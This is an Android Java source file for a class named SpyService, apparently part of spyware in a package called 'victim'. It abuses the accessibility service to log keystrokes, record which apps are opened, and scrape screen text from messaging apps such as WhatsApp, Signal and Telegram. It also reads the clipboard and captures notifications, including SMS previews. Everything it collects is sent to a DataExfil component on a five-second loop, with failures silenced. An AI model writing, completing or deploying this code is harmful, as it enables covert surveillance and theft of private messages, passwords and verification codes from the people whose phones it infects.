package com.geass.victim;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SpyService extends AccessibilityService {
    private static SpyService instance;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder keyBuffer = new StringBuilder();
    private StringBuilder smsBuffer = new StringBuilder();
    private SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
    private Runnable flushRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        flushRunnable = new Runnable() {
            @Override
            public void run() {
                if (keyBuffer.length() > 0) {
                    DataExfil.send(SpyService.this, "keystroke", keyBuffer.toString());
                    keyBuffer.setLength(0);
                }
                if (smsBuffer.length() > 0) {
                    DataExfil.send(SpyService.this, "sms_capture", smsBuffer.toString());
                    smsBuffer.setLength(0);
                }
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(flushRunnable);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            // Capture all text changes (keyboard input)
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                if (event.getText() != null && !event.getText().isEmpty()) {
                    CharSequence text = event.getText().get(0);
                    if (text != null && text.length() > 0) {
                        keyBuffer.append(text).append(" ");
                    }
                }
            }

            // Capture window changes (apps opened)
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
                String cls = event.getClassName() != null ? event.getClassName().toString() : "unknown";
                DataExfil.send(this, "app_opened", pkg + "|" + cls);

                // If messaging app is opened, capture screen content
                if (pkg.contains("sms") || pkg.contains("mms") || pkg.contains("whatsapp") ||
                        pkg.contains("telegram") || pkg.contains("signal") || pkg.contains("messenger")) {
                    handler.postDelayed(this::captureScreenContent, 1000);
                }
            }

            // Capture clipboard content
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null && clipboard.hasPrimaryClip() && clipboard.getPrimaryClip().getItemCount() > 0) {
                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                    if (item != null && item.getText() != null) {
                        String clip = item.getText().toString();
                        if (clip.length() > 0 && clip.length() < 10000) {
                            DataExfil.send(this, "clipboard", clip);
                        }
                    }
                }
            }

            // Capture notifications (including SMS previews)
            if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                if (event.getText() != null && !event.getText().isEmpty()) {
                    CharSequence notification = event.getText().get(0);
                    if (notification != null && notification.length() > 0) {
                        String notifStr = notification.toString();
                        DataExfil.send(this, "notification", notifStr);

                        // Extract SMS content from notification
                        if (notifStr.toLowerCase().contains("sms") ||
                                notifStr.toLowerCase().contains("message") ||
                                notifStr.toLowerCase().contains("رسالة")) {
                            smsBuffer.append(notifStr).append(" ");
                        }
                    }
                }
            }
        } catch (Exception e) {
            DataExfil.send(this, "error", e.getMessage());
        }
    }

    private void captureScreenContent() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String screenText = getAllTextFromNode(root);
                if (screenText.length() > 0 && screenText.length() < 50000) {
                    DataExfil.send(this, "screen_content", screenText.substring(0, Math.min(2000, screenText.length())));
                }
                root.recycle();
            }
        } catch (Exception e) {
            // Silent fail
        }
    }

    private String getAllTextFromNode(AccessibilityNodeInfo node) {
        StringBuilder text = new StringBuilder();
        try {
            if (node.getText() != null && node.getText().length() > 0) {
                text.append(node.getText().toString()).append(" ");
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    text.append(getAllTextFromNode(child));
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
        return text.toString();
    }

    public static SpyService getInstance() {
        return instance;
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        handler.removeCallbacks(flushRunnable);
        instance = null;
        super.onDestroy();
    }
}